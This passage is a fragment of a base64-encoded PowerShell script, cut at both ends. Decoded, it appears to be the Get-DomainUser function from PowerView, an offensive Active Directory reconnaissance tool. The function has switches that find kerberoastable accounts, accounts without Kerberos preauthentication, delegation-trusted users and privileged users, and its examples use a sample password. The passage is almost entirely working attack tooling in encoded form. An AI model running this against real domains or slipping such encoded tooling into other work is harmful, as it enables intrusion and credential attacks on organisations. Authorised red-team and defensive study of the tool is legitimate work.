gb3RoZXIgcHJpbmNpcGFscy4KCi5QQVJBTUVURVIgUHJlYXV0aE5vdFJlcXVpcmVkCgpTd2l0Y2guIFJldHVybiB1c2VyIGFjY291bnRzIHdpdGggIkRvIG5vdCByZXF1aXJlIEtlcmJlcm9zIHByZWF1dGhlbnRpY2F0aW9uIiBzZXQuCgouUEFSQU1FVEVSIERvbWFpbgoKU3BlY2lmaWVzIHRoZSBkb21haW4gdG8gdXNlIGZvciB0aGUgcXVlcnksIGRlZmF1bHRzIHRvIHRoZSBjdXJyZW50IGRvbWFpbi4KCi5QQVJBTUVURVIgTERBUEZpbHRlcgoKU3BlY2lmaWVzIGFuIExEQVAgcXVlcnkgc3RyaW5nIHRoYXQgaXMgdXNlZCB0byBmaWx0ZXIgQWN0aXZlIERpcmVjdG9yeSBvYmplY3RzLgoKLlBBUkFNRVRFUiBQcm9wZXJ0aWVzCgpTcGVjaWZpZXMgdGhlIHByb3BlcnRpZXMgb2YgdGhlIG91dHB1dCBvYmplY3QgdG8gcmV0cmlldmUgZnJvbSB0aGUgc2VydmVyLgoKLlBBUkFNRVRFUiBTZWFyY2hCYXNlCgpUaGUgTERBUCBzb3VyY2UgdG8gc2VhcmNoIHRocm91Z2gsIGUuZy4gIkxEQVA6Ly9PVT1zZWNyZXQsREM9dGVzdGxhYixEQz1sb2NhbCIKVXNlZnVsIGZvciBPVSBxdWVyaWVzLgoKLlBBUkFNRVRFUiBTZXJ2ZXIKClNwZWNpZmllcyBhbiBBY3RpdmUgRGlyZWN0b3J5IHNlcnZlciAoZG9tYWluIGNvbnRyb2xsZXIpIHRvIGJpbmQgdG8uCgouUEFSQU1FVEVSIFNlYXJjaFNjb3BlCgpTcGVjaWZpZXMgdGhlIHNjb3BlIHRvIHNlYXJjaCB1bmRlciwgQmFzZS9PbmVMZXZlbC9TdWJ0cmVlIChkZWZhdWx0IG9mIFN1YnRyZWUpLgoKLlBBUkFNRVRFUiBSZXN1bHRQYWdlU2l6ZQoKU3BlY2lmaWVzIHRoZSBQYWdlU2l6ZSB0byBzZXQgZm9yIHRoZSBMREFQIHNlYXJjaGVyIG9iamVjdC4KCi5QQVJBTUVURVIgU2VydmVyVGltZUxpbWl0CgpTcGVjaWZpZXMgdGhlIG1heGltdW0gYW1vdW50IG9mIHRpbWUgdGhlIHNlcnZlciBzcGVuZHMgc2VhcmNoaW5nLiBEZWZhdWx0IG9mIDEyMCBzZWNvbmRzLgoKLlBBUkFNRVRFUiBTZWN1cml0eU1hc2tzCgpTcGVjaWZpZXMgYW4gb3B0aW9uIGZvciBleGFtaW5pbmcgc2VjdXJpdHkgaW5mb3JtYXRpb24gb2YgYSBkaXJlY3Rvcnkgb2JqZWN0LgpPbmUgb2YgJ0RhY2wnLCAnR3JvdXAnLCAnTm9uZScsICdPd25lcicsICdTYWNsJy4KCi5QQVJBTUVURVIgVG9tYnN0b25lCgpTd2l0Y2guIFNwZWNpZmllcyB0aGF0IHRoZSBzZWFyY2hlciBzaG91bGQgYWxzbyByZXR1cm4gZGVsZXRlZC90b21ic3RvbmVkIG9iamVjdHMuCgouUEFSQU1FVEVSIEZpbmRPbmUKCk9ubHkgcmV0dXJuIG9uZSByZXN1bHQgb2JqZWN0LgoKLlBBUkFNRVRFUiBDcmVkZW50aWFsCgpBIFtNYW5hZ2VtZW50LkF1dG9tYXRpb24uUFNDcmVkZW50aWFsXSBvYmplY3Qgb2YgYWx0ZXJuYXRlIGNyZWRlbnRpYWxzCmZvciBjb25uZWN0aW9uIHRvIHRoZSB0YXJnZXQgZG9tYWluLgoKLlBBUkFNRVRFUiBSYXcKClN3aXRjaC4gUmV0dXJuIHJhdyByZXN1bHRzIGluc3RlYWQgb2YgdHJhbnNsYXRpbmcgdGhlIGZpZWxkcyBpbnRvIGEgY3VzdG9tIFBTT2JqZWN0LgoKLkVYQU1QTEUKCkdldC1Eb21haW5Vc2VyIC1Eb21haW4gdGVzdGxhYi5sb2NhbAoKUmV0dXJuIGFsbCB1c2VycyBmb3IgdGhlIHRlc3RsYWIubG9jYWwgZG9tYWluCgouRVhBTVBMRQoKR2V0LURvbWFpblVzZXIgIlMtMS01LTIxLTg5MDE3MTg1OS0zNDMzODA5Mjc5LTMzNjYxOTY3NTMtMTEwOCIsImFkbWluaXN0cmF0b3IiCgpSZXR1cm4gdGhlIHVzZXIgd2l0aCB0aGUgZ2l2ZW4gU0lELCBhcyB3ZWxsIGFzIEFkbWluaXN0cmF0b3IuCgouRVhBTVBMRQoKJ1MtMS01LTIxLTg5MDE3MTg1OS0zNDMzODA5Mjc5LTMzNjYxOTY3NTMtMTExNCcsICdDTj1kZm0sQ049VXNlcnMsREM9dGVzdGxhYixEQz1sb2NhbCcsJzRjNDM1ZGQ3LWRjNTgtNGIxNC05YTVlLTFmZGIwZTgwZDIwMScsJ2FkbWluaXN0cmF0b3InIHwgR2V0LURvbWFpblVzZXIgLVByb3BlcnRpZXMgc2FtYWNjb3VudG5hbWUsbGFzdGxvZ29mZgoKbGFzdGxvZ29mZiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgc2FtYWNjb3VudG5hbWUKLS0tLS0tLS0tLSAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgLS0tLS0tLS0tLS0tLS0KMTIvMzEvMTYwMCA0OjAwOjAwIFBNICAgICAgICAgICAgICAgICAgICAgICAgZGZtLmEKMTIvMzEvMTYwMCA0OjAwOjAwIFBNICAgICAgICAgICAgICAgICAgICAgICAgZGZtCjEyLzMxLzE2MDAgNDowMDowMCBQTSAgICAgICAgICAgICAgICAgICAgICAgIGhhcm1qMHkKMTIvMzEvMTYwMCA0OjAwOjAwIFBNICAgICAgICAgICAgICAgICAgICAgICAgQWRtaW5pc3RyYXRvcgoKLkVYQU1QTEUKCkdldC1Eb21haW5Vc2VyIC1TZWFyY2hCYXNlICJMREFQOi8vT1U9c2VjcmV0LERDPXRlc3RsYWIsREM9bG9jYWwiIC1BZG1pbkNvdW50IC1BbGxvd0RlbGVnYXRpb24KClNlYXJjaCB0aGUgc3BlY2lmaWVkIE9VIGZvciBwcml2aWxlZ2VkIHVzZXIgKEFkbWluQ291bnQgPSAxKSB0aGF0IGFsbG93IGRlbGVnYXRpb24KCi5FWEFNUExFCgpHZXQtRG9tYWluVXNlciAtTERBUEZpbHRlciAnKCFwcmltYXJ5Z3JvdXBpZD01MTMpJyAtUHJvcGVydGllcyBzYW1hY2NvdW50bmFtZSxsYXN0bG9nb24KClNlYXJjaCBmb3IgdXNlcnMgd2l0aCBhIHByaW1hcnkgZ3JvdXAgSUQgb3RoZXIgdGhhbiA1MTMgKCdkb21haW4gdXNlcnMnKSBhbmQgb25seSByZXR1cm4gc2FtYWNjb3VudG5hbWUgYW5kIGxhc3Rsb2dvbgoKLkVYQU1QTEUKCiRTZWNQYXNzd29yZCA9IENvbnZlcnRUby1TZWN1cmVTdHJpbmcgJ1Bhc3N3b3JkMTIzIScgLUFzUGxhaW5UZXh0IC1Gb3JjZQokQ3JlZCA9IE5ldy1PYmplY3QgU3lzdGVtLk1hbmFnZW1lbnQuQXV0b21hdGlvbi5QU0NyZWRlbnRpYWwoJ1RFU1RMQUJcZGZtLmEnLCAkU2VjUGFzc3dvcmQpCkdldC1Eb21haW5Vc2VyIC1DcmVkZW50aWFsICRDcmVkCgouRVhBTVBMRQoKR2V0LURvbWFpbiB8IFNlbGVjdC1PYmplY3QgLUV4cGFuZCBuYW1lCnRlc3RsYWIubG9jYWwKCkdldC1Eb21haW5Vc2VyIGRldlx1c2VyMSAtVmVyYm9zZSAtUHJvcGVydGllcyBkaXN0aW5ndWlzaGVkbmFtZQpWRVJCT1NFOiBbR2V0LURvbWFpblNlYXJjaGVyXSBzZWFyY2ggc3RyaW5nOiBMREFQOi8vUFJJTUFSWS50ZXN0bGFiLmxvY2FsL0RDPXRlc3RsYWIsREM9bG9jYWwKVkVSQk9TRTogW0dldC1Eb21haW5TZWFyY2hlcl0gc2VhcmNoIHN0cmluZzogTERBUDovL1BSSU1BUlkudGVzdGxhYi5sb2NhbC9EQz1kZXYsREM9dGVzdGxhYixEQz1sb2NhbApWRVJCT1NFOiBbR2V0LURvbWFpblVzZXJdIGZpbHRlciBzdHJpbmc6ICgmKHNhbUFjY291bnRUeXBlPTgwNTMwNjM2OCkofChzYW1BY2NvdW50TmFtZT11c2VyMSkpKQoKZGlzdGluZ3Vpc2hlZG5hbWUKLS0tLS0tLS0tLS0tLS0tLS0KQ049dXNlcjEsQ049VXNlcnMsREM9ZGV2LERDPXRlc3RsYWIsREM9bG9jYWwKCi5JTlBVVFMKClN0cmluZwoKLk9VVFBVVFMKClBvd2VyVmlldy5Vc2VyCgpDdXN0b20gUFNPYmplY3Qgd2l0aCB0cmFuc2xhdGVkIHVzZXIgcHJvcGVydHkgZmllbGRzLgoKUG93ZXJWaWV3LlVzZXIuUmF3CgpUaGUgcmF3IERpcmVjdG9yeVNlcnZpY2VzLlNlYXJjaFJlc3VsdCBvYmplY3QsIGlmIC1SYXcgaXMgZW5hYmxlZC4KIz4KCiAgICBbRGlhZ25vc3RpY3MuQ29kZUFuYWx5c2lzLlN1cHByZXNzTWVzc2FnZUF0dHJpYnV0ZSgnUFNVc2VEZWNsYXJlZFZhcnNNb3JlVGhhbkFzc2lnbm1lbnRzJywgJycpXQogICAgW0RpYWdub3N0aWNzLkNvZGVBbmFseXNpcy5TdXBwcmVzc01lc3NhZ2VBdHRyaWJ1dGUoJ1BTU2hvdWxkUHJvY2VzcycsICcnKV0KICAgIFtPdXRwdXRUeXBlKCdQb3dlclZpZXcuVXNlcicpXQogICAgW091dHB1dFR5cGUoJ1Bvd2VyVmlldy5Vc2VyLlJhdycpXQogICAgW0NtZGxldEJpbmRpbmcoRGVmYXVsdFBhcmFtZXRlclNldE5hbWUgPSAnQWxsb3dEZWxlZ2F0aW9uJyldCiAgICBQYXJhbSgKICAgICAgICBbUGFyYW1ldGVyKFBvc2l0aW9uID0gMCwgVmFsdWVGcm9tUGlwZWxpbmUgPSAkVHJ1ZSwgVmFsdWVGcm9tUGlwZWxpbmVCeVByb3BlcnR5TmFtZSA9ICRUcnVlKV0KICAgICAgICBbQWxpYXMoJ0Rpc3Rpbmd1aXNoZWROYW1lJywgJ1NhbUFjY291bnROYW1lJywgJ05hbWUnLCAnTWVtYmVyRGlzdGluZ3Vpc2hlZE5hbWUnLCAnTWVtYmVyTmFtZScpXQogICAgICAgIFtTdHJpbmdbXV0KICAgICAgICAkSWRlbnRpdHksCgogICAgICAgIFtTd2l0Y2hdCiAgICAgICAgJFNQTiwKCiAgICAgICAgW1N3aXRjaF0KICAgICAgICAkQWRtaW5Db3VudCwKCiAgICAgICAgW1BhcmFtZXRlcihQYXJhbWV0ZXJTZXROYW1lID0gJ0FsbG93RGVsZWdhdGlvbicpXQogICAgICAgIFtTd2l0Y2hdCiAgICAgICAgJEFsbG93RGVsZWdhdGlvbiwKCiAgICAgICAgW1BhcmFtZXRlcihQYXJhbWV0ZXJTZXROYW1lID0gJ0Rpc2FsbG93RGVsZWdhdGlvbicpXQogICAgICAgIFtTd2l0Y2hdCiAgICAgICAgJERpc2FsbG93RGVsZWdhdGlvbiwKCiAgICAgICAgW1N3aXRjaF0KICAgICAgICAkVHJ1c3RlZFRvQXV0aCwKCiAgICAgICAgW0FsaWFzKCdLZXJiZXJvc1ByZWF1dGhOb3RSZXF1aXJlZCcsICdOb1ByZWF1dGgnKV0KICAgICAgICBbU3dpdGNoXQogICAgICAgICRQcmVhdXRoTm90UmVxdWlyZWQsCgogICAgICAgIFtWYWxpZGF0ZU5vdE51bGxPckVtcHR5KCldCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkRG9tYWluLAoKICAgICAgICBbVmFsaWRhdGVOb3ROdWxsT3JFbXB0eSgpXQogICAgICAgIFtBbGlhcygnRmlsdGVyJyldCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkTERBUEZpbHRlciwKCiAgICAgICAgW1ZhbGlkYXRlTm90TnVsbE9yRW1wdHkoKV0KICAgICAgICBbU3RyaW5nW11dCiAgICAgICAgJFByb3BlcnRpZXMsCgogICAgICAgIFtWYWxpZGF0ZU5vdE51bGxPckVtcHR5KCldCiAgICAgICAgW0FsaWFzKCdBRFNQYXRoJyldCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkU2VhcmNoQmFzZSwKCiAgICAgICAgW1ZhbGlkYXRlTm90TnVsbE9yRW1wdHkoKV0KICAgICAgICBbQWxpYXMoJ0RvbWFpbkNvbnRyb2xsZXInKV0KICAgICAgICBbU3RyaW5nXQogICAgICAgICRTZXJ2ZXIsCgogICAgICAgIFtWYWxpZGF0ZVNldCgnQmFzZScsICdPbmVMZXZlbCcsICdTdWJ0cmVlJyldCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkU2VhcmNoU2NvcGUgPSAnU3VidHJlZScsCgogICAgICAgIFtWYWxpZGF0ZVJhbmdlKDEsIDEwMDAwKV0KICAgICAgICBbSW50XQogICAgICAgICRSZXN1bHRQYWdlU2l6ZSA9IDIwMCwKCiAgICAgICAgW1ZhbGlkYXRlUmFuZ2UoMSwgMTAwMDApXQogICAgICAgIFtJbnRdCiAgICAgICAgJFNlcnZlclRpbWVMaW1pdCwKCiAgICAgICAgW1ZhbGlkYXRlU2V0KCdEYWNsJywgJ0dyb3VwJywgJ05vbmUnLCAnT3duZXInLCAnU2FjbCcpXQogICAgICAgIFtTdHJpbmddCiAgICAgICAgJFNlY3VyaXR5TWFza3MsCgogICAgICAgIFtTd2l0Y2hdCiAgICAgICAgJFRvbWJzdG9uZSwKCiAgICAgICAgW0FsaWFzKCdSZXR1cm5PbmUnKV0KICAgICAgICBbU3dpdGNoXQogICAgICAgICRGaW5kT25lLAoKICAgICAgICBbTWFuYWdlbWVudC5BdXRvbWF0aW9uLlBTQ3JlZGVudGlhbF0KICAgICAgICBbTWFuYWdlbWVudC5BdXRvbWF0aW9uLkNyZWRlbnRpYWxBdHRyaWJ1dGUoKV0KICAgICAgICAkQ3JlZGVudGlhbCA9IFtNYW5hZ2VtZW50LkF1dG9tYXRpb24uUFNDcmVkZW50aWFsXTo6RW1wdHksCgogICAgICAgIFtTd2l0Y2hdCiAgICAgICAgJFJhdwogICAgKQoKICAgIEJFR0lOIHsKICAgICAgICAkU2VhcmNoZXJBcmd1bWVudHMgPSBAe30KICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydEb21haW4nXSkgeyAkU2VhcmNoZXJBcmd1bWVudHNbJ0RvbWFpbiddID0gJERvbWFpbiB9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snUHJvcGVydGllcyddKSB7ICRTZWFyY2hlckFyZ3VtZW50c1snUHJvcGVydGllcyddID0gJFByb3BlcnRpZXMgfQogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ1NlYXJjaEJhc2UnXSkgeyAkU2VhcmNoZXJBcmd1bWVudHNbJ1NlYXJjaEJhc2UnXSA9ICRTZWFyY2hCYXNlIH0KICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydTZXJ2ZXInXSkgeyAkU2VhcmNoZXJBcmd1bWVudHNbJ1NlcnZlciddID0gJFNlcnZlciB9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snU2VhcmNoU2NvcGUnXSkgeyAkU2VhcmNoZXJBcmd1bWVudHNbJ1NlYXJjaFNjb3BlJ10gPSAkU2VhcmNoU2NvcGUgfQogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ1Jlc3VsdFBhZ2VTaXplJ10pIHsgJFNlYXJjaGVyQXJndW1lbnRzWydSZXN1bHRQYWdlU2l6ZSddID0gJFJlc3VsdFBhZ2VTaXplIH0KICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydTZXJ2ZXJUaW1lTGltaXQnXSkgeyAkU2VhcmNoZXJBcmd1bWVudHNbJ1NlcnZlclRpbWVMaW1pdCddID0gJFNlcnZlclRpbWVMaW1pdCB9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snU2VjdXJpdHlNYXNrcyddKSB7ICRTZWFyY2hlckFyZ3VtZW50c1snU2VjdXJpdHlNYXNrcyddID0gJFNlY3VyaXR5TWFza3MgfQogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ1RvbWJzdG9uZSddKSB7ICRTZWFyY2hlckFyZ3VtZW50c1snVG9tYnN0b25lJ10gPSAkVG9tYnN0b25lIH0KICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydDcmVkZW50aWFsJ10pIHsgJFNlYXJjaGVyQXJndW1lbnRzWydDcmVkZW50aWFsJ10gPSAkQ3JlZGVudGlhbCB9CiAgICAgICAgJFVzZXJTZWFyY2hlciA9IEdldC1Eb21haW5TZWFyY2hlciBAU2VhcmNoZXJBcmd1bWVudHMKICAgIH0KCiAgICBQUk9DRVNTIHsKICAgICAgICBpZiAoJFVzZXJTZWFyY2hlcikgewogICAgICAgICAgICAkSWRlbnRpdHlGaWx0ZXIgPSAnJwogICAgICAgICAgICAkRmlsdGVyID0gJycKICAgICAgICAgICAgJElkZW50aXR5IHwgV2hlcmUtT2JqZWN0IHskX30gfCBGb3JFYWNoLU9iamVjdCB7CiAgICAgICAgICAgICAgICAkSWRlbnRpdHlJbnN0YW5jZSA9ICRfCiAgICAgICAgICAgICAgICBpZiAoJElkZW50aXR5SW5zdGFuY2UgLW1hdGNoICcuK1xcLisnKSB7CiAgICAgICAgICAgICAgICAgICAgJENvbnZlcnRlZElkZW50aXR5SW5zdGFuY2UgPSAkSWRlbnRpdHlJbnN0YW5jZSB8IENvbnZlcnQtQUROYW1lIC1PdXRwdXRUeXBlIENhbm9uaWNhbAogICAgICAgICAgICAgICAgICAgIGlmICgkQ29udmVydGVkSWRlbnRpdHlJbnN0YW5jZSkgewogICAgICAgICAgICAgICAgICAgICAgICAkVXNlckRvbWFpbiA9ICRDb252ZXJ0ZWRJZGVudGl0eUluc3RhbmNlLlN1YlN0cmluZygwLCAkQ29udmVydGVkSWRlbnRpdHlJbnN0YW5jZS5JbmRleE9mKCcvJykpCiAgICAgICAgICAgICAgICAgICAgICAgICRVc2VyTmFtZSA9ICRJZGVudGl0eUluc3RhbmNlLlNwbGl0KCdcJylbMV0KICAgICAgICAgICAgICAgICAgICAgICAgJElkZW50aXR5RmlsdGVyICs9ICIoc2FtQWNjb3VudE5hbWU9JFVzZXJOYW1lKSIKICAgICAgICAgICAgICAgICAgICAgICAgJFNlYXJjaGVyQXJndW1lbnRzWydEb21haW4nXSA9ICRVc2VyRG9tYWluCiAgICAgICAgICAgICAgICAgICAgICAgIFdyaXRlLVZlcmJvc2UgIltHZXQtRG9tYWluVXNlcl0gRXh0cmFjdGVkIGRvbWFpbiAnJFVzZXJEb21haW4nIGZyb20gJyRJZGVudGl0eUluc3RhbmNlJyIKICAgICAgICAgICAgICAgICAgICAgICAgJFVzZXJTZWFyY2hlciA9IEdldC1Eb21haW5TZWFyY2hlciBAU2VhcmNoZXJBcmd1bWVudHMKICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICBlbHNlIHsKICAgICAgICAgICAgICAgICAgICAkSWRlbnRpdHlJbnN0YW5jZSA9ICRJZGVudGl0eUluc3RhbmNlLlJlcGxhY2UoJygnLCAnXDI4JykuUmVwbGFjZSgnKScsICdcMjknKQogICAgICAgICAgICAgICAgICAgIGlmICgkSWRlbnRpdHlJbnN0YW5jZSAtbWF0Y2ggJ15TLTEtLionKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICMgU0lEIGZvcm1hdAogICAgICAgICAgICAgICAgICAgICAgICAkSWRlbnRpdHlGaWx0ZXIgKz0gIihvYmplY3RzaWQ9JElkZW50aXR5SW5zdGFuY2UpIgogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICBlbHNlaWYgKCRJZGVudGl0eUluc3RhbmNlIC1tYXRjaCAnXkNOPS4qJykgewogICAgICAgICAgICAgICAgICAgICAgICAjIGRpc3Rpbmd1aXNoZWQgbmFtZXMKICAgICAgICAgICAgICAgICAgICAgICAgJElkZW50aXR5RmlsdGVyICs9ICIoZGlzdGluZ3Vpc2hlZG5hbWU9JElkZW50aXR5SW5zdGFuY2UpIgogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICBlbHNlIHsKICAgICAgICAgICAgICAgICAgICAgICAgdHJ5IHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICRHdWlkQnl0ZVN0cmluZyA9ICgtSm9pbiAoKFtHdWlkXSRJZGVudGl0eUluc3RhbmNlKS5Ub0J5dGVBcnJheSgpIHwgRm9yRWFjaC1PYmplY3QgeyRfLlRvU3RyaW5nKCdYJykuUGFkTGVmdCgyLCcwJyl9KSkgLVJlcGxhY2UgJyguLiknLCdcJDEnCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkSWRlbnRpdHlGaWx0ZXIgKz0gIihvYmplY3RndWlkPSRHdWlkQnl0ZVN0cmluZykiCiAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAgICAgY2F0Y2ggewogICAgICAgICAgICAgICAgICAgICAgICAgICAgJElkZW50aXR5RmlsdGVyICs9ICIoc2FtQWNjb3VudE5hbWU9JElkZW50aXR5SW5zdGFuY2UpIgogICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9CiAgICAgICAgICAgIGlmICgkSWRlbnRpdHlGaWx0ZXIgLWFuZCAoJElkZW50aXR5RmlsdGVyLlRyaW0oKSAtbmUgJycpICkgewogICAgICAgICAgICAgICAgJEZpbHRlciArPSAiKHwkSWRlbnRpdHlGaWx0ZXIpIgogICAgICAgICAgICB9CgogICAgICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydTUE4nXSkgewogICAgICAgICAgICAgICAgV3JpdGUtVmVyYm9zZSAnW0dldC1Eb21haW5Vc2VyXSBTZWFyY2hpbmcgZm9yIG5vbi1udWxsIHNlcnZpY2UgcHJpbmNpcGFsIG5hbWVzJwogICAgICAgICAgICAgICAgJEZpbHRlciArPSAnKHNlcnZpY2VQcmluY2lwYWxOYW1lPSopJwogICAgICAgICAgICB9CiAgICAgICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ0FsbG93RGVsZWdhdGlvbiddKSB7CiAgICAgICAgICAgICAgICBXcml0ZS1WZXJib3NlICdbR2V0LURvbWFpblVzZXJdIFNlYXJjaGluZyBmb3IgdXNlcnMgd2hvIGNhbiBiZSBkZWxlZ2F0ZWQnCiAgICAgICAgICAgICAgICAjIG5lZ2F0aW9uIG9mICJBY2NvdW50cyB0aGF0IGFyZSBzZW5zaXRpdmUgYW5kIG5vdCB0cnVzdGVkIGZvciBkZWxlZ2F0aW9uIgogICAgICAgICAgICAgICAgJEZpbHRlciArPSAnKCEodXNlckFjY291bnRDb250cm9sOjEuMi44NDAuMTEzNTU2LjEuNC44MDM6PTEwNDg1NzQpKScKICAgICAgICAgICAgfQogICAgICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydEaXNhbGxvd0RlbGVnYXRpb24nXSkgewogICAgICAgICAgICAgICAgV3JpdGUtVmVyYm9zZSAnW0dldC1Eb21haW5Vc2VyXSBTZWFyY2hpbmcgZm9yIHVzZXJzIHdobyBhcmUgc2Vuc2l0aXZlIGFuZCBub3QgdHJ1c3RlZCBmb3IgZGVsZWdhdGlvbicKICAgICAgICAgICAgICAgICRGaWx0ZXIgKz0gJyh1c2VyQWNjb3VudENvbnRyb2w6MS4yLjg0MC4xMTM1NTYuMS40LjgwMzo9MTA0ODU3NCknCiAgICAgICAgICAgIH0KICAgICAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snQWRtaW5Db3VudCddKSB7CiAgICAgICAgICAgICAgICBXcml0ZS1WZXJib3NlICdbR2V0LURvbWFpblVzZXJdIFNlYXJjaGluZyBmb3IgYWRtaW5Db3VudD0xJwogICAgICAgICAgICAgICAgJEZpbHRlciArPSAnKGFkbWluY291bnQ9MSknCiAgICAgICAgICAgIH0KICAgICAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snVHJ1c3RlZFRvQXV0aCddKSB7CiAgICAgICAgICAgICAgICBXcml0ZS1WZXJib3NlICdbR2V0LURvbWFpblVzZXJdIFNlYXJjaGluZyBmb3IgdXNlcnMgdGhhdCBhcmUgdHJ1c3RlZCB0byBhdXRoZW50aWNhdGUgZm9yIG90aGVyIHByaW5jaXBhbHMnCiAgICAgICAgICAgICAgICAkRmlsdGVyICs9ICcobXNkcy1hbGxvd2VkdG9kZWxlZ2F0ZXRvPSopJwogICAgICAgICAgICB9CiAgICAgICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ1ByZWF1dGhOb3RSZXF1aXJlZCddKSB7CiAgICAgICAgICAgICAgICBXcml0ZS1WZXJib3NlICdbR2V0LURvbWFpblVzZXJdIFNlYXJjaGluZyBmb3IgdXNlciBhY2NvdW50cyB0aGF0IGRvIG5vdCByZXF1aXJlIGtlcmJlcm9zIHByZWF1dGhlbnRpY2F0ZScKICAgICAgICAgICAgICAgICRGaWx0ZXIgKz0gJyh1c2VyQWNjb3VudENvbnRyb2w6MS4yLjg0MC4xMTM1NTYuMS40LjgwMzo9NDE5NDMwNCknCiAgICAgICAgICAgIH0KICAgICAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snTERBUEZpbHRlciddKSB7CiAgICAgICAgICAgICAgICBXcml0ZS1WZXJib3NlICJbR2V0LURvbWFpblVzZXJdIFVzaW5nIGFkZGl0aW9uYWwgTERBUCBmaWx0ZXI6ICRMREFQRmlsdGVyIgogICAgICAgICAgICAgICAgJEZpbHRlciArPSAiJExEQVBGaWx0ZXIiCiAgICAgICAgICAgIH0KCiAgICAgICAgICAgICRVc2VyU2VhcmNoZXIuZmlsdGVyID0gIigmKHNhbUFjY291bnRUeXBlPTgwNTMwNjM2OCkkRmlsdGVyKSIKICAgICAgICAgICAgV3JpdGUtVmVyYm9zZSAiW0dldC1Eb21haW5Vc2VyXSBmaWx0ZXIgc3RyaW5nOiAkKCRVc2VyU2VhcmNoZXIuZmlsdGVyKSIKCiAgICAgICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ0ZpbmRPbmUnXSkgeyAkUmVzdWx0cyA9ICRVc2VyU2VhcmNoZXIuRmluZE9uZSgpIH0KICAgICAgICAgICAgZWxzZSB7ICRSZXN1bHRzID0gJFVzZXJTZWFyY2hlci5GaW5kQWxsKCkgfQogICAgICAgICAgICAkUmVzdWx0cyB8IFdoZXJlLU9iamVjdCB7JF99IHwgRm9yRWFjaC1PYmplY3QgewogICAgICAgICAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snUmF3J10pIHsKICAgICAgICAgICAgICAgICAgICAjIHJldHVybiByYXcgcmVzdWx0IG9iamVjdHMKICAgICAgICAgICAgICAgICAgICAkVXNlciA9ICRfCiAgICAgICAgICAgICAgICAgICAgJFVzZXIuUFNPYmplY3QuVHlwZU5hbWVzLkluc2VydCgwLCAnUG93ZXJWaWV3LlVzZXIuUmF3JykKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIGVsc2UgewogICAgICAgICAgICAgICAgICAgICRVc2VyID0gQ29udmVydC1MREFQUHJvcGVydHkgLVByb3BlcnRpZXMgJF8uUHJvcGVydGllcwogICAgICAgICAgICAgICAgICAgICRVc2VyLlBTT2JqZWN0LlR5cGVOYW1lcy5JbnNlcnQoMCwgJ1Bvd2VyVmlldy5Vc2VyJykKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICRVc2VyCiAgICAgICAgICAgIH0KICAgICAgICAgICAgaWYgKCRSZXN1bHRzKSB7CiAgICAgICAgICAgICAgICB0cnkgeyAkUmVzdWx0cy5kaXNwb3NlKCkgfQogICAgICAgICAgICAgICAgY2F0Y2ggewogICAgICAgICAgICAgICAgICAgIFdyaXRlLVZlcmJvc2UgIltHZXQtRG9tYWluVXNlcl0gRXJyb3IgZGlzcG9zaW5nIG9mIHRoZSBSZXN1bHRzIG9iamVjdDogJF8iCiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgIH0KICAgICAgICAgICAgJFVzZXJTZWFyY2hlci5kaXNwb3NlKCkKICAgICAgICB9CiAgICB9Cn0KCgpmdW5jdGlvbiBOZXctRG9tYWluVXNlciB7CjwjCi5TWU5PUFNJUwoKQ3JlYXRlcyBhIG5ldyBkb21haW4gdXNlciAoYXNzdW1pbmcgYXBwcm9wcmlhdGUgcGVybWlzc2lvbnMpIGFuZCByZXR1cm5zIHRoZSB1c2VyIG9iamVjdC4KClRPRE86IGltcGxlbWVudCBhbGwgcHJvcGVydGllcyB0aGF0IE5ldy1BRFVzZXIgaW1wbGVtZW50cyAoaHR0cHM6Ly90ZWNobmV0Lm1pY3Jvc29mdC5jb20vZW4tdXMvbGlicmFyeS9lZTYxNzI1My5hc3B4KS4KCkF1dGhvcjogV2lsbCBTY2hyb2VkZXIgKEBoYXJtajB5KSAgCkxpY2Vuc2U6IEJTRCAzLUNsYXVzZSAgClJlcXVpcmVkIERlcGVuZGVuY2llczogR2V0LVByaW5jaXBhbENvbnRleHQgIAoKLkRFU0NSSVBUSU9OCgpGaXJzdCBiaW5kcyB0byB0aGUgc3BlY2l